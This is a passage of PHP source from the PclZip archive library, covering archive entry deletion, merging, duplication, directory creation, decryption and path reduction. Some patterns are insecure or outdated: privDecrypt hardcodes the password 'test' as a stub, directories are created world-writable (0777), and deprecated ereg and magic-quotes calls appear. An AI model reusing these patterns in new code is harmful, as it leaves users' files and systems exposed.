                  elseif (   (($v_header_list[$v_nb_extracted]['external']&0x00000010)==0x00000010) /* Indicates a folder */
                          && ($v_header_list[$v_nb_extracted]['stored_filename'].'/' == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The entry is the searched directory");
                      $v_found = true;
                  }
              }
              // ----- Look for a filename
              elseif ($v_header_list[$v_nb_extracted]['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "The file is the right one.");
                  $v_found = true;
              }
          }
      }

      // ----- Look for extract by ereg rule
      else if (   (isset($p_options[PCLZIP_OPT_BY_EREG]))
               && ($p_options[PCLZIP_OPT_BY_EREG] != "")) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract by ereg '".$p_options[PCLZIP_OPT_BY_EREG]."'");

          if (ereg($p_options[PCLZIP_OPT_BY_EREG], $v_header_list[$v_nb_extracted]['stored_filename'])) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Filename match the regular expression");
              $v_found = true;
          }
      }

      // ----- Look for extract by preg rule
      else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
               && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract with rule 'ByEreg'");

          if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header_list[$v_nb_extracted]['stored_filename'])) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Filename match the regular expression");
              $v_found = true;
          }
      }

      // ----- Look for extract by index rule
      else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
               && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Extract with rule 'ByIndex'");

          // ----- Look if the index is in the list
          for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_found); $j++) {
              //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Look if index '$i' is in [".$p_options[PCLZIP_OPT_BY_INDEX][$j]['start'].",".$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']."]");

              if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Found as part of an index range");
                  $v_found = true;
              }
              if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Do not look this index range for next loop");
                  $j_start = $j+1;
              }

              if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                  //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Index range is greater than index, stop loop");
                  break;
              }
          }
      }
      else {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "No argument mean remove all file");
        $v_found = true;
      }

      // ----- Look for deletion
      if ($v_found)
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File '".$v_header_list[$v_nb_extracted]['stored_filename']."', index '$i' need to be deleted");
        unset($v_header_list[$v_nb_extracted]);
      }
      else
      {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File '".$v_header_list[$v_nb_extracted]['stored_filename']."', index '$i' will not be deleted");
        $v_nb_extracted++;
      }
    }

    // ----- Look if something need to be deleted
    if ($v_nb_extracted > 0) {

        // ----- Creates a temporay file
        $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

        // ----- Creates a temporary zip archive
        $v_temp_zip = new PclZip($v_zip_temp_name);

        // ----- Open the temporary zip file in write mode
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary write mode");
        if (($v_result = $v_temp_zip->privOpenFd('wb')) != 1) {
            $this->privCloseFd();

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
        }

        // ----- Look which file need to be kept
        for ($i=0; $i<sizeof($v_header_list); $i++) {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Keep entry index '$i' : '".$v_header_list[$i]['filename']."'");

            // ----- Calculate the position of the header
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Offset='". $v_header_list[$i]['offset']."'");
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position before rewind : ".ftell($this->zip_fd)."'");
            @rewind($this->zip_fd);
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position after rewind : ".ftell($this->zip_fd)."'");
            if (@fseek($this->zip_fd,  $v_header_list[$i]['offset'])) {
                // ----- Close the zip file
                $this->privCloseFd();
                $v_temp_zip->privCloseFd();
                @unlink($v_zip_temp_name);

                // ----- Error log
                PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

                // ----- Return
                //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
                return PclZip::errorCode();
            }
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position after fseek : ".ftell($this->zip_fd)."'");

            // ----- Read the file header
            $v_local_header = array();
            if (($v_result = $this->privReadFileHeader($v_local_header)) != 1) {
                // ----- Close the zip file
                $this->privCloseFd();
                $v_temp_zip->privCloseFd();
                @unlink($v_zip_temp_name);

                // ----- Return
                //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
                return $v_result;
            }
            
            // ----- Check that local file header is same as central file header
            if ($this->privCheckFileHeaders($v_local_header,
                                                        $v_header_list[$i]) != 1) {
                // TBC
            }
            unset($v_local_header);

            // ----- Write the file header
            if (($v_result = $v_temp_zip->privWriteFileHeader($v_header_list[$i])) != 1) {
                // ----- Close the zip file
                $this->privCloseFd();
                $v_temp_zip->privCloseFd();
                @unlink($v_zip_temp_name);

                // ----- Return
                //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
                return $v_result;
            }
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Offset for this file is '".$v_header_list[$i]['offset']."'");

            // ----- Read/write the data block
            if (($v_result = PclZipUtilCopyBlock($this->zip_fd, $v_temp_zip->zip_fd, $v_header_list[$i]['compressed_size'])) != 1) {
                // ----- Close the zip file
                $this->privCloseFd();
                $v_temp_zip->privCloseFd();
                @unlink($v_zip_temp_name);

                // ----- Return
                //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
                return $v_result;
            }
        }

        // ----- Store the offset of the central dir
        $v_offset = @ftell($v_temp_zip->zip_fd);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "New offset of central dir : $v_offset");

        // ----- Re-Create the Central Dir files header
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Creates the new central directory");
        for ($i=0; $i<sizeof($v_header_list); $i++) {
            // ----- Create the file header
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Offset of file : ".$v_header_list[$i]['offset']);
            if (($v_result = $v_temp_zip->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
                $v_temp_zip->privCloseFd();
                $this->privCloseFd();
                @unlink($v_zip_temp_name);

                // ----- Return
                //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
                return $v_result;
            }

            // ----- Transform the header to a 'usable' info
            $v_temp_zip->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
        }

        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Creates the central directory footer");

        // ----- Zip file comment
        $v_comment = '';
        if (isset($p_options[PCLZIP_OPT_COMMENT])) {
          $v_comment = $p_options[PCLZIP_OPT_COMMENT];
        }

        // ----- Calculate the size of the central header
        $v_size = @ftell($v_temp_zip->zip_fd)-$v_offset;

        // ----- Create the central dir footer
        if (($v_result = $v_temp_zip->privWriteCentralHeader(sizeof($v_header_list), $v_size, $v_offset, $v_comment)) != 1) {
            // ----- Reset the file list
            unset($v_header_list);
            $v_temp_zip->privCloseFd();
            $this->privCloseFd();
            @unlink($v_zip_temp_name);

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
        }

        // ----- Close
        $v_temp_zip->privCloseFd();
        $this->privCloseFd();

        // ----- Delete the zip file
        // TBC : I should test the result ...
        @unlink($this->zipname);

        // ----- Rename the temporary file
        // TBC : I should test the result ...
        //@rename($v_zip_temp_name, $this->zipname);
        PclZipUtilRename($v_zip_temp_name, $this->zipname);
    
        // ----- Destroy the temporary archive
        unset($v_temp_zip);
    }
    
    // ----- Remove every files : reset the file
    else if ($v_central_dir['entries'] != 0) {
        $this->privCloseFd();

        if (($v_result = $this->privOpenFd('wb')) != 1) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
          return $v_result;
        }

        if (($v_result = $this->privWriteCentralHeader(0, 0, 0, '')) != 1) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
          return $v_result;
        }

        $this->privCloseFd();
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privDirCheck()
  // Description :
  //   Check if a directory exists, if not it creates it and all the parents directory
  //   which may be useful.
  // Parameters :
  //   $p_dir : Directory path to check.
  // Return Values :
  //    1 : OK
  //   -1 : Unable to create directory
  // --------------------------------------------------------------------------------
  function privDirCheck($p_dir, $p_is_dir=false)
  {
    $v_result = 1;

    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privDirCheck", "entry='$p_dir', is_dir='".($p_is_dir?"true":"false")."'");

    // ----- Remove the final '/'
    if (($p_is_dir) && (substr($p_dir, -1)=='/'))
    {
      $p_dir = substr($p_dir, 0, strlen($p_dir)-1);
    }
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Looking for entry '$p_dir'");

    // ----- Check the directory availability
    if ((is_dir($p_dir)) || ($p_dir == ""))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, "'$p_dir' is a directory");
      return 1;
    }

    // ----- Extract parent directory
    $p_parent_dir = dirname($p_dir);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Parent directory is '$p_parent_dir'");

    // ----- Just a check
    if ($p_parent_dir != $p_dir)
    {
      // ----- Look for parent directory
      if ($p_parent_dir != "")
      {
        if (($v_result = $this->privDirCheck($p_parent_dir)) != 1)
        {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
          return $v_result;
        }
      }
    }

    // ----- Create the directory
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Create directory '$p_dir'");
    if (!@mkdir($p_dir, 0777))
    {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_DIR_CREATE_FAIL, "Unable to create directory '$p_dir'");

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result, "Directory '$p_dir' created");
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privMerge()
  // Description :
  //   If $p_archive_to_add does not exist, the function exit with a success result.
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privMerge(&$p_archive_to_add)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privMerge", "archive='".$p_archive_to_add->zipname."'");
    $v_result=1;

    // ----- Look if the archive_to_add exists
    if (!is_file($p_archive_to_add->zipname))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Archive to add does not exist. End of merge.");

      // ----- Nothing to merge, so merge is a success
      $v_result = 1;

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Look if the archive exists
    if (!is_file($this->zipname))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Archive does not exist, duplicate the archive_to_add.");

      // ----- Do a duplicate
      $v_result = $this->privDuplicate($p_archive_to_add->zipname);

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Open the zip file
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($v_result=$this->privOpenFd('rb')) != 1)
    {
      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Read the central directory informations
    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privCloseFd();
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Go to beginning of File
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position in zip : ".ftell($this->zip_fd)."'");
    @rewind($this->zip_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position in zip : ".ftell($this->zip_fd)."'");

    // ----- Open the archive_to_add file
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open archive_to_add in binary read mode");
    if (($v_result=$p_archive_to_add->privOpenFd('rb')) != 1)
    {
      $this->privCloseFd();

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Read the central directory informations
    $v_central_dir_to_add = array();
    if (($v_result = $p_archive_to_add->privReadEndCentralDir($v_central_dir_to_add)) != 1)
    {
      $this->privCloseFd();
      $p_archive_to_add->privCloseFd();

      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Go to beginning of File
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position in archive_to_add : ".ftell($p_archive_to_add->zip_fd)."'");
    @rewind($p_archive_to_add->zip_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position in archive_to_add : ".ftell($p_archive_to_add->zip_fd)."'");

    // ----- Creates a temporay file
    $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

    // ----- Open the temporary file in write mode
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
    {
      $this->privCloseFd();
      $p_archive_to_add->privCloseFd();

      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Copy the files from the archive to the temporary file
    // TBC : Here I should better append the file and go back to erase the central dir
    $v_size = $v_central_dir['offset'];
    while ($v_size != 0)
    {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
      $v_buffer = fread($this->zip_fd, $v_read_size);
      @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }

    // ----- Copy the files from the archive_to_add into the temporary file
    $v_size = $v_central_dir_to_add['offset'];
    while ($v_size != 0)
    {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
      $v_buffer = fread($p_archive_to_add->zip_fd, $v_read_size);
      @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }

    // ----- Store the offset of the central dir
    $v_offset = @ftell($v_zip_temp_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "New offset of central dir : $v_offset");

    // ----- Copy the block of file headers from the old archive
    $v_size = $v_central_dir['size'];
    while ($v_size != 0)
    {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
      $v_buffer = @fread($this->zip_fd, $v_read_size);
      @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }

    // ----- Copy the block of file headers from the archive_to_add
    $v_size = $v_central_dir_to_add['size'];
    while ($v_size != 0)
    {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
      $v_buffer = @fread($p_archive_to_add->zip_fd, $v_read_size);
      @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }

    // ----- Merge the file comments
    $v_comment = $v_central_dir['comment'].' '.$v_central_dir_to_add['comment'];

    // ----- Calculate the size of the (new) central header
    $v_size = @ftell($v_zip_temp_fd)-$v_offset;

    // ----- Swap the file descriptor
    // Here is a trick : I swap the temporary fd with the zip fd, in order to use
    // the following methods on the temporary fil and not the real archive fd
    $v_swap = $this->zip_fd;
    $this->zip_fd = $v_zip_temp_fd;
    $v_zip_temp_fd = $v_swap;

    // ----- Create the central dir footer
    if (($v_result = $this->privWriteCentralHeader($v_central_dir['entries']+$v_central_dir_to_add['entries'], $v_size, $v_offset, $v_comment)) != 1)
    {
      $this->privCloseFd();
      $p_archive_to_add->privCloseFd();
      @fclose($v_zip_temp_fd);
      $this->zip_fd = null;

      // ----- Reset the file list
      unset($v_header_list);

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Swap back the file descriptor
    $v_swap = $this->zip_fd;
    $this->zip_fd = $v_zip_temp_fd;
    $v_zip_temp_fd = $v_swap;

    // ----- Close
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    // ----- Close the temporary file
    @fclose($v_zip_temp_fd);

    // ----- Delete the zip file
    // TBC : I should test the result ...
    @unlink($this->zipname);

    // ----- Rename the temporary file
    // TBC : I should test the result ...
    //@rename($v_zip_temp_name, $this->zipname);
    PclZipUtilRename($v_zip_temp_name, $this->zipname);

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privDuplicate()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privDuplicate($p_archive_filename)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privDuplicate", "archive_filename='$p_archive_filename'");
    $v_result=1;

    // ----- Look if the $p_archive_filename exists
    if (!is_file($p_archive_filename))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Archive to duplicate does not exist. End of duplicate.");

      // ----- Nothing to duplicate, so duplicate is a success.
      $v_result = 1;

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Open the zip file
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($v_result=$this->privOpenFd('wb')) != 1)
    {
      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Open the temporary file in write mode
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($v_zip_temp_fd = @fopen($p_archive_filename, 'rb')) == 0)
    {
      $this->privCloseFd();

      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive file \''.$p_archive_filename.'\' in binary write mode');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Copy the files from the archive to the temporary file
    // TBC : Here I should better append the file and go back to erase the central dir
    $v_size = filesize($p_archive_filename);
    while ($v_size != 0)
    {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Read $v_read_size bytes");
      $v_buffer = fread($v_zip_temp_fd, $v_read_size);
      @fwrite($this->zip_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }

    // ----- Close
    $this->privCloseFd();

    // ----- Close the temporary file
    @fclose($v_zip_temp_fd);

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privErrorLog()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function privErrorLog($p_error_code=0, $p_error_string='')
  {
    if (PCLZIP_ERROR_EXTERNAL == 1) {
      PclError($p_error_code, $p_error_string);
    }
    else {
      $this->error_code = $p_error_code;
      $this->error_string = $p_error_string;
    }
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privErrorReset()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function privErrorReset()
  {
    if (PCLZIP_ERROR_EXTERNAL == 1) {
      PclErrorReset();
    }
    else {
      $this->error_code = 0;
      $this->error_string = '';
    }
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privDecrypt()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privDecrypt($p_encryption_header, &$p_buffer, $p_size, $p_crc)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::privDecrypt', "size=".$p_size."");
    $v_result=1;
    
    // ----- To Be Modified ;-)
    $v_pwd = "test";
    
    $p_buffer = PclZipUtilZipDecrypt($p_buffer, $p_size, $p_encryption_header,
                                         $p_crc, $v_pwd);
    
    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privDisableMagicQuotes()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privDisableMagicQuotes()
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::privDisableMagicQuotes', "");
    $v_result=1;

    // ----- Look if function exists
    if (   (!function_exists("get_magic_quotes_runtime"))
            || (!function_exists("set_magic_quotes_runtime"))) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Functions *et_magic_quotes_runtime are not supported");
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
        }

    // ----- Look if already done
    if ($this->magic_quotes_status != -1) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "magic_quote already disabled");
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
        }

        // ----- Get and memorize the magic_quote value
        $this->magic_quotes_status = @get_magic_quotes_runtime();
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Current magic_quotes_runtime status is '".($this->magic_quotes_status==0?'disable':'enable')."'");

        // ----- Disable magic_quotes
        if ($this->magic_quotes_status == 1) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Disable magic_quotes");
          @set_magic_quotes_runtime(0);
        }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privSwapBackMagicQuotes()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privSwapBackMagicQuotes()
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::privSwapBackMagicQuotes', "");
    $v_result=1;

    // ----- Look if function exists
    if (   (!function_exists("get_magic_quotes_runtime"))
            || (!function_exists("set_magic_quotes_runtime"))) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Functions *et_magic_quotes_runtime are not supported");
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
        }

    // ----- Look if something to do
    if ($this->magic_quotes_status != -1) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "magic_quote not modified");
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
        }

        // ----- Swap back magic_quotes
        if ($this->magic_quotes_status == 1) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Enable back magic_quotes");
          @set_magic_quotes_runtime($this->magic_quotes_status);
        }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  }
  // End of class
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : PclZipUtilPathReduction()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function PclZipUtilPathReduction($p_dir)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZipUtilPathReduction", "dir='$p_dir'");
    $v_result = "";

    // ----- Look for not empty path
    if ($p_dir != "") {
      // ----- Explode path by directory names
      $v_list = explode("/", $p_dir);

      // ----- Study directories from last to first
      $v_skip = 0;
      for ($i=sizeof($v_list)-1; $i>=0; $i--) {
        // ----- Look for current path
        if ($v_list[$i] == ".") {
          // ----- Ignore this directory
          // Should be the first $i=0, but no check is done
        }
        else if ($v_list[$i] == "..") {
                  $v_skip++;
        }
        else if ($v_list[$i] == "") {
                  // ----- First '/' i.e. root slash
                  if ($i == 0) {
            $v_result = "/".$v_result;
                    if ($v_skip > 0) {
                        // ----- It is an invalid path, so the path is not modified
                        // TBC
                        $v_result = $p_dir;
                //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Invalid path is unchanged");
                $v_skip = 0;
                    }
                  }
                  // ----- Last '/' i.e. indicates a directory
                  else if ($i == (sizeof($v_list)-1)) {
            $v_result = $v_list[$i];
                  }
                  // ----- Double '/' inside the path
                  else {
            // ----- Ignore only the double '//' in path,
            // but not the first and last '/'
                  }
        }
        else {
                  // ----- Look for item to skip
                  if ($v_skip > 0) {
                    $v_skip--;
                  }
                  else {
            $v_result = $v_list[$i].($i!=(sizeof($v_list)-1)?"/".$v_result:"");
                  }
        }
      }
      
      // ----- Look for skip
      if ($v_skip > 0) {
        while ($v_skip > 0) {
            $v_result = '../'.$v_result;
            $v_skip--;
        }
      }
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : PclZipUtilPathInclusion()
  // Description :
  //   This function indicates if the path $p_path is under the $p_dir tree. Or,
  //   said in an other way, if the file or sub-dir $p_path is inside the dir
  //   $p_dir.
  //   The function indicates also if the path is exactly the same as the dir.
  //   This function supports path with duplicated '/' like '//', but does not
  //   support '.' or '..' statements.
  // Parameters :
  // Return Values :
  //   0 if $p_path is not inside directory $p_dir
  //   1 if $p_path is inside directory $p_dir
  //   2 if $p_path is exactly the same as $p_dir
  // --------------------------------------------------------------------------------
  function PclZipUtilPathInclusion($p_dir, $p_path)
  {
